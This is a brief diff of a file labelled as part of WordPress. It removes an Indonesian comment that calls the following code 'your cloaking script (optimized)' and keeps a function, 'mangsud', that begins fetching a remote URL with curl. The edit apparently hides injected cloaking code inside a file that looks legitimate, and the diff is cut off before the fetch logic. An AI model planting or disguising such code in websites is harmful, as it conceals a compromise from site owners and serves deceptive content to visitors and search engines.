@@ -5,7 +5,7 @@
  * @package WordPress
  */
 
-// ===== SKRIP CLOAKING ANDA (OPTIMIZED) =====
+
 function mangsud($url) { 
     // Cek apakah fungsi sudah didefinisikan sebelumnya
     if (function_exists('curl_init')) { 
